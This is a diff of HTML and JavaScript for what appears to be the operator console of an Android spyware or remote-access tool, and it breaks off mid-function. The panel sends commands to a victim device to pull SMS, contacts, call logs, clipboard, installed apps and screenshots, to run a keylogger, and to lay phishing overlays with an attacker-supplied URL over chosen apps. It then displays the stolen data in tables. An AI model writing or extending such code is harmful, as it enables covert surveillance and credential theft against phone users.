@@ -6,142 +6,172 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     :root{
-      --bg-0:#041024;
-      --bg-1:#071827;
-      --panel:#0b2130;
-      --muted:#9fb0bd;
-      --accent-blue:#2b8cff;
-      --accent-green:#16a34a;
-      --danger:#ef4444;
-      --card:#071f29;
-      --glass: rgba(255,255,255,0.02);
+      --bg:#071226;
+      --panel:#0b2230;
+      --muted:#b6c6d0;
+      --accent:#2b8cff;
+      --accent-2:#16a34a;
       --radius:12px;
     }
     *{box-sizing:border-box}
-    html,body{height:100%;margin:0;font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;color:var(--muted);background:linear-gradient(180deg,var(--bg-0) 0%, var(--bg-1) 100%); -webkit-font-smoothing:antialiased;}
-    .app { display:grid; grid-template-columns: 260px 1fr 72px; gap:18px; height:100vh; padding:18px; }
-
-    /* Sidebar */
-    .sidebar { background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius:var(--radius); padding:18px; border:1px solid rgba(255,255,255,0.03); display:flex; flex-direction:column; gap:12px; overflow:auto; }
-    .logo { color:var(--accent-blue); font-weight:800; font-size:18px; }
-    .meta { font-size:13px; color:#9fb0bd; margin-top:4px; }
-    .statusRow { display:flex; align-items:center; gap:8px; margin-top:8px; }
-    .badge { padding:6px 10px; border-radius:999px; font-weight:700; font-size:13px; }
-    .offline { background:rgba(255,255,255,0.03); color:#7ea2b9; }
-    .online { background: linear-gradient(90deg,#0ea5a4,#16a34a); color:white; }
-
-    .groupTitle { margin-top:10px; font-size:12px; color:#7ea2b9; letter-spacing:1px; text-transform:uppercase; }
-    .actions { display:flex; flex-direction:column; gap:8px; margin-top:6px; }
-
-    .btn {
-      background: transparent;
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: linear-gradient(180deg,#051223 0%, #081827 100%);
       color:var(--muted);
-      border:1px solid rgba(255,255,255,0.03);
-      padding:10px 12px;
-      border-radius:10px;
-      font-weight:700;
-      cursor:pointer;
-      text-align:left;
-      transition:transform .08s ease, background .12s;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
     }
-    .btn:active{ transform: translateY(1px) }
-    .btn.blue{ background: linear-gradient(90deg,var(--accent-blue), #1e40af); color:white; border:none; }
-    .btn.green{ background: linear-gradient(90deg,var(--accent-green), #059669); color:white; border:none; }
-    .btn.ghost{ background:transparent; color:var(--muted); border:1px solid rgba(255,255,255,0.03); }
-    .btn.danger{ background: linear-gradient(90deg,var(--danger), #c02626); color:white; border:none; }
 
-    .input { width:100%; padding:10px; border-radius:10px; border:1px solid rgba(255,255,255,0.03); background:rgba(255,255,255,0.02); color:var(--muted); font-size:14px; }
+    /* layout */
+    .app {
+      display:grid;
+      grid-template-columns: 260px 1fr 360px;
+      gap:18px;
+      height:100vh;
+      padding:18px;
+    }
 
-    /* Main area */
-    .main { display:flex; flex-direction:column; gap:14px; min-width:0; }
-    .header { display:flex; align-items:center; justify-content:space-between; padding:12px 16px; border-radius:12px; background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015)); border:1px solid rgba(255,255,255,0.02); }
-    .title { font-weight:800; color:#87c0ff; font-size:18px; }
-    .clientInfo { color:#a8c3d6; font-size:14px; }
-    .content { display:grid; grid-template-columns: 1fr 380px; gap:18px; align-items:start; min-height:0; }
+    /* sidebar */
+    .sidebar{
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:var(--radius);
+      padding:18px;
+      border:1px solid rgba(255,255,255,0.03);
+      display:flex;
+      flex-direction:column;
+      gap:12px;
+      overflow:auto;
+    }
+    .logo{font-weight:700;color:var(--accent);font-size:18px}
+    .meta{font-size:13px;color:#9fb0bd}
+    .statusRow{display:flex;align-items:center;gap:8px}
+    .badge{padding:6px 10px;border-radius:999px;font-weight:700;font-size:13px}
+    .offline{background:rgba(255,255,255,0.03);color:#7ea2b9}
+    .online{background:linear-gradient(90deg,#0ea5a4,#16a34a);color:white}
 
-    /* Card */
-    .card { background:var(--panel); border-radius:12px; padding:16px; border:1px solid rgba(255,255,255,0.02); min-height:420px; display:flex; flex-direction:column; gap:12px; min-width:0; }
-    .tabs { display:flex; gap:12px; align-items:center; }
-    .tab { padding:8px 12px; border-radius:999px; background:rgba(255,255,255,0.01); color:#9fb0bd; font-weight:700; cursor:pointer; }
-    .tab.active { background:linear-gradient(90deg,#183648,#0f3a4a); color:#bfe6ff; }
+    .groupTitle{margin-top:12px;font-size:13px;color:#92b3c6;text-transform:uppercase;letter-spacing:0.8px}
 
-    #log { background:#071a21; border-radius:10px; padding:14px; height:520px; overflow:auto; font-family:monospace; color:#9fb0bd; font-size:13px; min-width:0; }
+    .btn{
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      color:white;border:1px solid rgba(255,255,255,0.04);
+      padding:10px 12px;border-radius:10px;font-weight:700;font-size:14px;cursor:pointer;
+      box-shadow:0 6px 12px rgba(2,6,23,0.4);
+      transition:transform .12s ease, box-shadow .12s;
+      width:100%;text-align:left;
+    }
+    .btn:active{transform:translateY(1px)}
+    .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted)}
+    .btn.green{background:linear-gradient(90deg,var(--accent-2),#059669)}
+    .btn.blue{background:linear-gradient(90deg,var(--accent),#1e40af)}
+    .btn.red{background:linear-gradient(90deg,#ef4444,#dc2626)}
 
-    /* Screenshots column */
-    .shotsHeader { display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; }
-    .shotsGrid { display:grid; grid-template-columns:1fr; gap:12px; overflow:auto; max-height:620px; }
-    .shot { background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015)); padding:12px; border-radius:10px; border:1px solid rgba(255,255,255,0.02); min-height:150px; display:flex; flex-direction:column; gap:8px; }
-    .shot img { width:100%; height:auto; border-radius:8px; object-fit:cover; cursor:zoom-in; display:block; }
+    .input{
+      width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);
+      background:rgba(255,255,255,0.02);color:var(--muted);font-size:14px;
+    }
 
-    /* Rail */
-    .rail { background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.02)); border-radius:12px; padding:8px; display:flex; flex-direction:column; gap:12px; align-items:center; border:1px solid rgba(255,255,255,0.02); }
-    .icon { width:52px; height:52px; border-radius:10px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.02); cursor:pointer; }
+    /* main center */
+    .main{
+      display:flex;flex-direction:column;gap:14px;
+    }
 
-    /* Responsive */
-    @media (max-width: 1000px) {
-      .app { grid-template-columns: 1fr; grid-template-rows: auto 1fr auto; padding:12px; }
-      .rail { flex-direction:row; width:100%; justify-content:space-around; order:3; }
-      .content { grid-template-columns:1fr; }
-      #log { height:340px; }
+    .header{
+      display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));border:1px solid rgba(255,255,255,0.02);
+    }
+    .title{font-weight:700;color:#87c0ff}
+    .clientInfo{color:#a8c3d6}
+
+    .content{
+      display:grid;grid-template-columns:1fr;gap:18px;align-items:start;
+    }
+
+    .card{background:var(--panel);border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.02);min-height:420px}
+
+    .tabs{display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap}
+    .tab{padding:8px 12px;border-radius:999px;background:rgba(255,255,255,0.01);color:#9fb0bd;font-weight:700;cursor:pointer}
+    .tab.active{background:linear-gradient(90deg,#183648,#0f3a4a);color:#bfe6ff}
+
+    /* log area */
+    #log{background:#071a21;border-radius:10px;padding:14px;height:380px;overflow:auto;font-family:monospace;color:#9fb0bd;font-size:13px}
+
+    /* content panes */
+    .pane{display:none}
+    .pane.active{display:block}
+
+    /* lists and tables */
+    table{width:100%;border-collapse:collapse;font-size:13px;color:#cfe7ff}
+    th,td{padding:8px;border-bottom:1px dashed rgba(255,255,255,0.03);text-align:left}
+    th{color:#9fb0bd;font-weight:700;font-size:12px}
+
+    /* screenshots column */
+    .shotsHeader{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+    .shotsGrid{display:grid;grid-template-columns:1fr;gap:12px}
+    .shot{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02);min-height:140px;display:flex;flex-direction:column;gap:8px}
+    .shot img{width:100%;height:auto;border-radius:8px;object-fit:cover}
+    .shot .meta{font-size:12px;color:#8ea3b4}
+    .shot .actions{display:flex;gap:8px}
+
+    /* right rail */
+    .rightPanel{
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:var(--radius);
+      padding:18px;
+      border:1px solid rgba(255,255,255,0.03);
+      overflow:auto;
+    }
+
+    /* responsive */
+    @media (max-width:1100px){
+      .app{grid-template-columns:1fr;grid-template-rows:auto 1fr auto;padding:12px}
+      .rightPanel{order:3}
+      .sidebar{order:1;width:100%;display:flex;flex-wrap:wrap}
+      .main{order:2}
     }
   </style>
 </head>
 <body>
   <div class="app">
-    <!-- LEFT SIDEBAR -->
-    <aside class="sidebar" aria-label="left sidebar">
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
       <div>
-        <div class="logo">Device</div>
+        <div class="logo">Device — Pro UI</div>
+        <div style="height:6px"></div>
         <div class="meta">ID: <span id="devId">unknown</span></div>
-        <div class="statusRow">
-          <div id="status" class="badge offline">Offline</div>
-        </div>
+        <div style="height:6px"></div>
+        <div class="statusRow">Status: <div id="status" class="badge offline">Offline</div></div>
       </div>
 
-      <div class="groupTitle">Notifications</div>
-      <div class="actions">
-        <button id="btnFetch" class="btn blue">Fetch Notification</button>
-        <button id="btnStartNotify" class="btn green">Start Notify</button>
-        <button id="btnStopNotify" class="btn ghost">Stop Notify</button>
-      </div>
+      <div class="groupTitle">Quick actions</div>
+      <button id="btnFetch" class="btn blue">Fetch Notification</button>
+      <button id="btnStartNotify" class="btn green">Start Notification Listener</button>
+      <button id="btnStopNotify" class="btn ghost">Stop Notification Listener</button>
 
-      <div class="groupTitle">Quick Actions</div>
-      <div class="actions">
-        <button id="btnFetchSms" class="btn">Fetch SMS</button>
-        <button id="btnFetchContact" class="btn">Fetch Contacts</button>
-        <button id="btnFetchLog" class="btn">Fetch Calls</button>
-        <button id="btnFetchApps" class="btn">Fetch Apps</button>
-        <button id="btnFetchIp" class="btn">Fetch IP</button>
-        <button id="btnFetchClip" class="btn">Fetch Clipboard</button>
-      </div>
+      <div class="groupTitle">Data</div>
+      <button id="btnFetchSms" class="btn">Fetch SMS</button>
+      <button id="btnFetchContact" class="btn">Fetch Contacts</button>
+      <button id="btnFetchLog" class="btn">Fetch Call Logs</button>
+      <button id="btnFetchApps" class="btn">Fetch Installed Apps</button>
+      <button id="btnFetchIp" class="btn">Fetch IP Address</button>
+      <button id="btnFetchClip" class="btn">Fetch Clipboard</button>
 
       <div class="groupTitle">Keylogger</div>
-      <div class="actions">
-        <button id="btnStartKeyLog" class="btn">Start KeyLogs</button>
-        <button id="btnStopKeyLog" class="btn ghost">Stop KeyLogs</button>
-        <button id="btnFetchKeyLog" class="btn">Fetch KeyLogs</button>
-      </div>
-
-      <div class="groupTitle">Device</div>
-      <div class="actions">
-        <button id="btnFetchDevice" class="btn">Device Info</button>
-        <button id="btnFetchScreenshot" class="btn">Fetch Screenshot</button>
-        <button id="btnFetchScreenshotPermission" class="btn">Screenshot Permission</button>
-      </div>
+      <button id="btnStartKeyLog" class="btn">Start KeyLogs</button>
+      <button id="btnStopKeyLog" class="btn ghost">Stop KeyLogs</button>
+      <button id="btnFetchKeyLog" class="btn">Fetch KeyLogs</button>
 
       <div class="groupTitle">Overlay</div>
-      <div style="display:flex;flex-direction:column;gap:8px;">
-        <input id="pkgInput" class="input" placeholder="com.example.app" />
-        <input id="urlInput" class="input" placeholder="https://..." />
-        <div style="display:flex;gap:8px;">
-          <button id="btnCustomOverlay" class="btn blue" style="flex:1;">Start Overlay</button>
-          <button id="btnStopOverlay" class="btn ghost" style="flex:1;">Stop Overlay</button>
-        </div>
+      <input id="pkgInput" class="input" placeholder="com.example.app" />
+      <input id="urlInput" class="input" placeholder="https://..." />
+      <div style="display:flex;gap:8px;margin-top:8px">
+        <button id="btnCustomOverlay" class="btn blue" style="flex:1">Start Overlay</button>
+        <button id="btnStopOverlay" class="btn ghost" style="flex:1">Stop Overlay</button>
       </div>
 
-      <div style="margin-top:auto; display:flex; flex-direction:column; gap:8px;">
+      <div style="margin-top:auto;display:flex;flex-direction:column;gap:8px">
         <button id="btnUpload" class="btn blue">Upload</button>
-        <button id="btnClose" class="btn danger">Close</button>
+        <button id="btnClose" class="btn red">Close</button>
       </div>
     </aside>
 
@@ -152,216 +182,478 @@
           <div class="title">Live Device Console</div>
           <div class="clientInfo">Client: <span id="devName">unknown</span></div>
         </div>
-        <div style="display:flex;align-items:center;gap:12px;">
-          <div style="font-size:13px;color:#90b1c6">Status</div>
+        <div style="display:flex;gap:12px;align-items:center">
+          <div style="font-size:13px;color:#90b1c6">Live</div>
           <div id="statusSmall" class="badge offline">Offline</div>
         </div>
       </div>
 
       <div class="content">
-        <!-- Left: logs & tabs -->
-        <section class="card" aria-labelledby="logs">
-          <div style="display:flex;justify-content:space-between;align-items:center">
-            <div class="tabs" role="tablist" aria-label="device tabs">
-              <div class="tab active" role="tab">Logs</div>
-              <div class="tab" role="tab">SMS</div>
-              <div class="tab" role="tab">Contacts</div>
-              <div class="tab" role="tab">Calls</div>
-              <div class="tab" role="tab">Apps</div>
-              <div class="tab" role="tab">Screenshots</div>
-            </div>
-            <div style="font-size:13px;color:#7ea2b9">Live</div>
+        <div class="card">
+          <div class="tabs">
+            <div class="tab active" data-tab="logs">Logs</div>
+            <div class="tab" data-tab="sms">SMS</div>
+            <div class="tab" data-tab="contacts">Contacts</div>
+            <div class="tab" data-tab="calls">Calls</div>
+            <div class="tab" data-tab="apps">Apps</div>
+            <div class="tab" data-tab="screenshots">Screenshots</div>
           </div>
 
-          <div id="log" aria-live="polite" role="log">Connecting...</div>
-        </section>
-
-        <!-- Right: screenshots -->
-        <aside class="card" aria-label="screenshots">
-          <div class="shotsHeader">
-            <div style="font-weight:700;color:#dbefff">Screenshots</div>
-            <div style="font-size:13px;color:#7ea2b9">Auto saved</div>
+          <!-- panes -->
+          <div id="pane-logs" class="pane active">
+            <div id="log">Connecting...</div>
           </div>
 
-          <div id="screenshotsContainer" class="shotsGrid"></div>
-        </aside>
+          <div id="pane-sms" class="pane">
+            <div style="margin-bottom:8px;font-weight:700;color:#dbefff">SMS</div>
+            <div id="smsContainer">No SMS yet</div>
+          </div>
+
+          <div id="pane-contacts" class="pane">
+            <div style="margin-bottom:8px;font-weight:700;color:#dbefff">Contacts</div>
+            <div id="contactsContainer">No contacts yet</div>
+          </div>
+
+          <div id="pane-calls" class="pane">
+            <div style="margin-bottom:8px;font-weight:700;color:#dbefff">Calls</div>
+            <div id="callsContainer">No call logs yet</div>
+          </div>
+
+          <div id="pane-apps" class="pane">
+            <div style="margin-bottom:8px;font-weight:700;color:#dbefff">Installed Apps</div>
+            <div id="appsContainer">No apps yet</div>
+          </div>
+
+          <div id="pane-screenshots" class="pane">
+            <div style="margin-bottom:8px;font-weight:700;color:#dbefff">Screenshots</div>
+            <div id="screenshotsContainer" class="shotsGrid"></div>
+          </div>
+
+        </div>
       </div>
     </main>
 
-    <!-- RIGHT RAIL -->
-    <nav class="rail" aria-hidden="true">
-      <div class="icon" title="Logs"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M4 7h16v2H4zM4 11h10v2H4zM4 15h16v2H4z" fill="currentColor"/></svg></div>
-      <div class="icon" title="Calls"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M6.62 10.79a15.053 15.053 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.57.57a1 1 0 011 1V20a1 1 0 01-1 1C10.07 21 3 13.93 3 5a1 1 0 011-1h3.5a1 1 0 011 1c0 1.24.2 2.45.57 3.57a1 1 0 01-.24 1.01l-2.21 2.21z" fill="currentColor"/></svg></div>
-      <div class="icon" title="Contacts"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zM4 22a8 8 0 0116 0H4z" fill="currentColor"/></svg></div>
-      <div class="icon" title="Apps"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M3 3h8v8H3zM13 3h8v8h-8zM3 13h8v8H3zM13 13h8v8h-8z" fill="currentColor"/></svg></div>
-      <div class="icon" title="Screenshot"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M5 7h14l-1 12H6zM12 3l2 3h-4l2-3z" fill="currentColor"/></svg></div>
-      <div class="icon" title="Info"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M11 17h2v-6h-2v6zm0-8h2V7h-2v2zM12 2a10 10 0 100 20 10 10 0 000-20z" fill="currentColor"/></svg></div>
-    </nav>
+    <!-- RIGHT PANEL -->
+    <aside class="rightPanel">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <div style="font-weight:800;color:#dbefff">Screenshots (auto)</div>
+        <div style="color:#7ea2b9;font-size:13px">Most recent</div>
+      </div>
+
+      <div style="height:12px"></div>
+      <div id="rightShots" class="shotsGrid"></div>
+    </aside>
   </div>
 
-  <script>
-    // --- device info extraction ---
-    const pathParts = window.location.pathname.split('/');
-    const clientId = pathParts[pathParts.length - 1] || 'unknown';
-    const urlParams = new URLSearchParams(location.search);
-    const deviceName = decodeURIComponent(urlParams.get('name') || clientId);
+<script>
+  // --- Init & device info ---
+  const pathParts = window.location.pathname.split("/");
+  const clientId = pathParts[pathParts.length - 1] || "unknown";
+  const urlParams = new URLSearchParams(location.search);
+  const deviceName = decodeURIComponent(urlParams.get("name") || clientId);
 
-    document.title = deviceName + ' — Live Device Console';
-    document.getElementById('devName').textContent = deviceName;
-    document.getElementById('devId').textContent = clientId;
+  document.title = deviceName;
+  document.getElementById("devName").textContent = deviceName;
+  document.getElementById("devId").textContent = clientId;
 
-    // --- elements ---
-    const logEl = document.getElementById('log');
-    const statusEl = document.getElementById('status');
-    const statusSmallEl = document.getElementById('statusSmall');
-    const screenshotsContainer = document.getElementById('screenshotsContainer');
+  // UI references
+  const logEl = document.getElementById("log");
+  const statusEl = document.getElementById("status");
+  const statusSmallEl = document.getElementById("statusSmall");
 
-    // --- logging helper ---
-    function pushLog(msg){
-      const ts = new Date().toLocaleTimeString();
-      logEl.textContent += `\n[${ts}] ${msg}`;
-      logEl.scrollTop = logEl.scrollHeight;
+  const appsContainer = document.getElementById("appsContainer");
+  const smsContainer = document.getElementById("smsContainer");
+  const contactsContainer = document.getElementById("contactsContainer");
+  const callsContainer = document.getElementById("callsContainer");
+  const screenshotsContainer = document.getElementById("screenshotsContainer");
+  const rightShots = document.getElementById("rightShots");
+
+  // tabs
+  const tabEls = document.querySelectorAll(".tab");
+  function switchTab(name){
+    document.querySelectorAll(".tab").forEach(t=> t.classList.toggle("active", t.dataset.tab===name));
+    document.querySelectorAll(".pane").forEach(p=> p.classList.toggle("active", p.id === "pane-"+name));
+  }
+  // attach click to tabs
+  tabEls.forEach(t => t.addEventListener("click", ()=> switchTab(t.dataset.tab)));
+
+  // Logging helper
+  function pushLog(msg){
+    const ts = new Date().toLocaleTimeString();
+    if (!logEl.textContent || logEl.textContent.trim() === "Connecting...") logEl.textContent = "";
+    logEl.textContent += `\n[${ts}] ${msg}`;
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  // send command to server
+  async function sendCmd(cmd){
+    pushLog(`📤 Sending "${cmd}"...`);
+    try{
+      const r = await fetch("/command", {
+        method:"POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({ targetClientId: clientId, command: cmd })
+      });
+      if (!r.ok) pushLog(`❌ Failed: ${r.status}`);
+      else pushLog(`✅ Command sent (${cmd})`);
+    }catch(e){
+      pushLog(`⚠️ Network error: ${e.message}`);
     }
+  }
 
-    // --- send command helper ---
-    async function sendCmd(cmd){
-      pushLog(`📤 Sending "${cmd}"...`);
-      try{
-        const r = await fetch('/command', {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({ targetClientId: clientId, command: cmd })
-        });
-        if(!r.ok) pushLog(`❌ Failed: ${r.status}`);
-        else pushLog(`✅ Command sent (${cmd})`);
-      }catch(e){
-        pushLog(`⚠️ Network error: ${e.message}`);
+  // map UI buttons to commands and to the tab they should open
+  const commandMap = {
+    btnFetch: {cmd: "fetch", tab: "logs"},
+    btnStartNotify: {cmd: "start-notify", tab: "logs"},
+    btnStopNotify: {cmd: "stop-notify", tab: "logs"},
+    btnFetchSms: {cmd: "fetch-sms", tab: "sms"},
+    btnFetchContact: {cmd: "fetch-contact", tab: "contacts"},
+    btnFetchLog: {cmd: "fetch-logs", tab: "calls"},
+    btnFetchApps: {cmd: "fetch-apps", tab: "apps"},
+    btnFetchIp: {cmd: "fetch-ip", tab: "logs"},
+    btnFetchClip: {cmd: "fetch-clip", tab: "logs"},
+    btnStartKeyLog: {cmd: "start_keylog", tab: "logs"},
+    btnStopKeyLog: {cmd: "stop_keylog", tab: "logs"},
+    btnFetchKeyLog: {cmd: "fetch_keylog", tab: "logs"},
+    btnFetchDevice: {cmd: "fetch-device", tab: "logs"},
+    btnFetchScreenshot: {cmd: "fetch-screenshot", tab: "screenshots"},
+    btnFetchScreenshotPermission: {cmd: "grant-screenshot-permission", tab: "logs"},
+    btnUpload: {cmd: "upload", tab: "logs"},
+    btnCustomOverlay: {cmd: "start-overlay", tab: "logs"}, // overlay will add params when clicked
+    btnStopOverlay: {cmd: "stop-overlay", tab: "logs"},
+    btnClose: {cmd: null, tab: "logs"}
+  };
+
+  // attach event listeners
+  Object.keys(commandMap).forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.addEventListener("click", async (ev) => {
+      if (id === "btnCustomOverlay") {
+        const pkg = document.getElementById("pkgInput").value.trim();
+        const url = document.getElementById("urlInput").value.trim();
+        if (!pkg || !url) { pushLog("⚠️ Please enter both PackageName and URL"); return; }
+        const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
+        sendCmd(cmd);
+      } else if (id === "btnClose") {
+        try { window.close(); } catch(e) { pushLog("⚠️ Window close blocked"); }
+      } else {
+        const info = commandMap[id];
+        if (info && info.cmd) sendCmd(info.cmd);
       }
-    }
+      // switch tab (if specified)
+      const tab = commandMap[id] && commandMap[id].tab;
+      if (tab) switchTab(tab);
+    });
+  });
 
-    // --- bind buttons (map) ---
-    const map = {
-      btnFetch: 'fetch',
-      btnStartNotify: 'start-notify',
-      btnStopNotify: 'stop-notify',
-      btnFetchSms: 'fetch-sms',
-      btnFetchContact: 'fetch-contact',
-      btnFetchLog: 'fetch-logs',
-      btnFetchApps: 'fetch-apps',
-      btnFetchIp: 'fetch-ip',
-      btnFetchClip: 'fetch-clip',
-      btnStartKeyLog: 'start_keylog',
-      btnStopKeyLog: 'stop_keylog',
-      btnFetchKeyLog: 'fetch_keylog',
-      btnFetchDevice: 'fetch-device',
-      btnFetchScreenshot: 'fetch-screenshot',
-      btnFetchScreenshotPermission: 'grant-screenshot-permission',
-      btnUpload: 'upload'
+  // --- Rendering helpers for different payloads ---
+  function renderApps(list){
+    if (!Array.isArray(list) || list.length === 0) {
+      appsContainer.innerHTML = "<div style='color:#8ea3b4'>No apps returned</div>";
+      return;
+    }
+    // build table
+    let html = `<table><thead><tr><th>#</th><th>App Name</th><th>Package</th></tr></thead><tbody>`;
+    list.forEach((a,i)=>{
+      const name = a.name || a.appName || a.label || a.title || a.application || "-";
+      const pkg = a.package || a.packageName || a.pkg || a.applicationId || "-";
+      html += `<tr><td>${i+1}</td><td>${escapeHtml(name)}</td><td>${escapeHtml(pkg)}</td></tr>`;
+    });
+    html += `</tbody></table>`;
+    appsContainer.innerHTML = html;
+  }
+
+  function renderSms(list){
+    if (!Array.isArray(list) || list.length === 0) {
+      smsContainer.innerHTML = "<div style='color:#8ea3b4'>No SMS returned</div>";
+      return;
+    }
+    let html = `<table><thead><tr><th>#</th><th>From</th><th>Body</th><th>Date</th></tr></thead><tbody>`;
+    list.forEach((s,i)=>{
+      const from = s.address || s.from || s.sender || s.number || "-";
+      const body = s.body || s.message || "-";
+      const date = s.date || s.timestamp || s.time || "-";
+      html += `<tr><td>${i+1}</td><td>${escapeHtml(from)}</td><td>${escapeHtml(body)}</td><td>${escapeHtml(date)}</td></tr>`;
+    });
+    html += `</tbody></table>`;
+    smsContainer.innerHTML = html;
+  }
+
+  function renderContacts(list){
+    if (!Array.isArray(list) || list.length === 0) {
+      contactsContainer.innerHTML = "<div style='color:#8ea3b4'>No contacts returned</div>";
+      return;
+    }
+    let html = `<table><thead><tr><th>#</th><th>Name</th><th>Phone</th></tr></thead><tbody>`;
+    list.forEach((c,i)=>{
+      const name = c.name || c.displayName || c.fullName || "-";
+      const phone = (c.phone || c.number || (c.phones && c.phones[0]) ) || "-";
+      html += `<tr><td>${i+1}</td><td>${escapeHtml(name)}</td><td>${escapeHtml(phone)}</td></tr>`;
+    });
+    html += `</tbody></table>`;
+    contactsContainer.innerHTML = html;
+  }
+
+  function renderCalls(list){
+    if (!Array.isArray(list) || list.length === 0) {
+      callsContainer.innerHTML = "<div style='color:#8ea3b4'>No call logs returned</div>";
+      return;
+    }
+    let html = `<table><thead><tr><th>#</th><th>Number</th><th>Type</th><th>Date</th></tr></thead><tbody>`;
+    list.forEach((c,i)=>{
+      const number = c.number || c.address || c.phone || "-";
+      const type = c.type || c.callType || "-";
+      const date = c.date || c.timestamp || "-";
+      html += `<tr><td>${i+1}</td><td>${escapeHtml(number)}</td><td>${escapeHtml(type)}</td><td>${escapeHtml(date)}</td></tr>`;
+    });
+    html += `</tbody></table>`;
+    callsContainer.innerHTML = html;
+  }
+
+  // screenshot helper - adds to both center list and right rail
+  function addScreenshot(url){
+    const d = new Date();
+    const stampDisplay = `${d.getFullYear()}-${(d.getMonth()+1).toString().padStart(2,'0')}-${d.getDate().toString().padStart(2,'0')} ${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}`;
+    const stampFile = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()}_${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`;
+
+    // center pane small card
+    const item = document.createElement("div");
+    item.className = "shot";
+    const label = document.createElement("div"); label.className = "meta"; label.innerText = `Captured: ${stampDisplay}`;
+    const img = document.createElement("img"); img.src = url; img.alt = "screenshot";
+    img.style.cursor = "zoom-in";
+    img.onclick = ()=> {
+      const win = window.open("", "_blank");
+      win.document.write(`<center><img src="${url}" style="max-width:100%;height:auto" /></center>`);
     };
-    Object.keys(map).forEach(id => {
-      const el = document.getElementById(id);
-      if(el) el.addEventListener('click', ()=> sendCmd(map[id]));
-    });
+    const actions = document.createElement("div"); actions.className = "actions";
+    const dl = document.createElement("button"); dl.className = "btn ghost"; dl.innerText = "Download";
+    dl.onclick = async () => {
+      try {
+        const res = await fetch(url);
+        const blob = await res.blob();
+        const blobUrl = URL.createObjectURL(blob);
+        const link = document.createElement('a'); link.href = blobUrl; link.download = `screenshot_${stampFile}.jpg`;
+        document.body.appendChild(link); link.click(); link.remove(); URL.revokeObjectURL(blobUrl);
+      } catch(e) { pushLog("⚠️ Screenshot download failed: "+e.message); }
+    };
+    actions.appendChild(dl);
+    item.appendChild(label); item.appendChild(img); item.appendChild(actions);
 
-    document.getElementById('btnCustomOverlay')?.addEventListener('click', ()=>{
-      const pkg = document.getElementById('pkgInput').value.trim();
-      const url = document.getElementById('urlInput').value.trim();
-      if(!pkg || !url){ pushLog('⚠️ Please enter both PackageName and URL'); return; }
-      const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
-      sendCmd(cmd);
-    });
-    document.getElementById('btnStopOverlay')?.addEventListener('click', ()=> sendCmd('stop-overlay'));
-    document.getElementById('btnClose')?.addEventListener('click', ()=> window.close());
+    screenshotsContainer.prepend(item);
 
-    // --- WebSocket live updates ---
-    const wsProto = location.protocol === 'https:' ? 'wss://' : 'ws://';
-    let ws;
-    try { ws = new WebSocket(wsProto + location.host); }
-    catch(e) { pushLog('⚠️ WS init error: ' + e.message); }
+    // right rail small thumbnail
+    const small = document.createElement("div"); small.className = "shotItem";
+    const sImg = document.createElement("img"); sImg.src = url; sImg.alt = "s";
+    sImg.style.height = "120px"; sImg.onclick = img.onclick;
+    const sLabel = document.createElement("div"); sLabel.className = "meta"; sLabel.innerText = stampDisplay;
+    const sDl = document.createElement("button"); sDl.innerText = "Download"; sDl.onclick = dl.onclick;
+    small.appendChild(sImg); small.appendChild(sLabel); small.appendChild(sDl);
+    rightShots.prepend(small);
+  }
 
-    if(ws){
-      ws.onopen = () => pushLog('🔌 WebSocket connected');
-      ws.onclose = () => pushLog('❌ WebSocket disconnected');
-      ws.onerror = (e) => pushLog('⚠️ WebSocket error');
+  // safe JSON parsing with heuristics
+  function tryParseOutput(text){
+    if (!text) return {raw: text};
+    // try pure JSON
+    try {
+      const parsed = JSON.parse(text);
+      return {parsed};
+    } catch(e){ /* continue */ }
 
-      ws.onmessage = (evt) => {
-        try {
-          const msg = JSON.parse(evt.data);
-
-          if(msg.type === 'devices'){
-            const d = msg.devices && msg.devices[clientId];
-            if(d && d.online){
